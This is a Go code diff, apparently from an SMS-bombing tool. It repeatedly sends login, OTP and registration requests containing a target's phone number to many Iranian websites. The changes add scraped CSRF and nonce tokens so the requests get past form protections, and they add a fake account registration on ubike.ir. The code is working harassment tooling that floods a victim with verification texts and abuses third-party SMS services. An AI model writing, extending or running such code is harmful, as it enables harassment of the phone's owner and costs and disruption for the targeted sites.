@@ -375,6 +375,16 @@ cookieJar, _ := cookiejar.New(nil)
 	for i := 0; i < repeatCount; i++ {
 		
 		
+		// api.ostadkr.com (JSON)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				sendJSONRequest(c, ctx, "https://api.ostadkr.com/login", map[string]interface{}{ 
+					"mobile": phone,
+				}, &wg, ch)
+			}
+		}(client) 
+
 		// caropex.com (JSON)
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
@@ -477,7 +487,7 @@ cookieJar, _ := cookiejar.New(nil)
 				formData.Set("action", "digits_check_mob")
 				formData.Set("countrycode", "+98")
 				formData.Set("mobileNo", phone)
-				formData.Set("csrf", "0a60a620d9")
+				formData.Set("csrf", "a7f8f61fb7") //check
 				formData.Set("login", "2")
 				formData.Set("username", "")
 				formData.Set("email", "")
@@ -495,20 +505,8 @@ cookieJar, _ := cookiejar.New(nil)
 			return func() {
 				formData := url.Values{}
 				formData.Set("phone", phone)
+				formData.Set("csrf", "18f7cd28c5ca167e123c1d124da12e07385e8a89534cdb5f81c2378fb8cb2ed5")  // cheack
 				sendFormRequest(c, ctx, "https://pirankalaco.ir/SendPhone.php", formData, &wg, ch) 
-			}
-		}(client) 
-
-		// https://refahtea.ir/wp-admin/admin-ajax.php (Form Data)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				formData := url.Values{}
-				formData.Set("action", "refah_send_code")
-				formData.Set("mobile", phone)
-				formData.Set("security", "placeholder")
-
-				sendFormRequest(c, ctx, "https://refahtea.ir/wp-admin/admin-ajax.php", formData, &wg, ch) 
 			}
 		}(client) 
 
@@ -517,21 +515,43 @@ cookieJar, _ := cookiejar.New(nil)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
 				formData := url.Values{}
-				formData.Set("action", "logini_first")
-				formData.Set("login", phone)
+				formData.Set("digt_countrycode", "+98")
+				formData.Set("phone", strings.TrimPrefix(phone, "0"))
+				formData.Set("email", "codedbymonsmain@gmail.com")
+				formData.Set("digits_reg_name", "monsmain")
+				formData.Set("digits_reg_password", "monsmain@")
+				formData.Set("digits_process_register", "1")
+				formData.Set("sms_otp", "")
+				formData.Set("otp_step_1", "1")
+				formData.Set("signup_otp_mode", "1")
+				formData.Set("instance_id", "ea7d4be3904cd4ad5b2151792c321660") //cheack
+				formData.Set("optional_data", "optional_data")
+				formData.Set("action", "digits_forms_ajax")
+				formData.Set("type", "register")
+				formData.Set("dig_otp", "")
+				formData.Set("digits", "1")
+				formData.Set("digits_redirect_page", "//ubike.ir/?page=1&redirect_to=https%3A%2F%2Fubike.ir%2F")
+				formData.Set("digits_form", "ea46521f64") //cheack
+				formData.Set("_wp_http_referer", "/?login=true&page=1&redirect_to=https%3A%2F%2Fubike.ir%2F")
+				formData.Set("container", "digits_protected")
+				formData.Set("sub_action", "sms_otp")
+
 				sendFormRequest(c, ctx, "https://ubike.ir/wp-admin/admin-ajax.php", formData, &wg, ch) 
 			}
 		}(client) 
 
-		// api.ostadkr.com (JSON)
+		// https://refahtea.ir (Form Data)
 		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
+		tasks <- func(c *http.Client) func() { 
 			return func() {
-				sendJSONRequest(c, ctx, "https://api.ostadkr.com/login", map[string]interface{}{ 
-					"mobile": phone,
-				}, &wg, ch)
+				formData := url.Values{}
+				formData.Set("action", "refah_send_code")
+				formData.Set("mobile", phone)
+				formData.Set("security", "157e0ae7ff") //cheack
+				sendFormRequest(c, ctx, "https://refahtea.ir/wp-admin/admin-ajax.php", formData, &wg, ch) 
 			}
 		}(client) 
+
 /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 // --- 123kif - CheckMobile (POST, JSON)
 wg.Add(1)
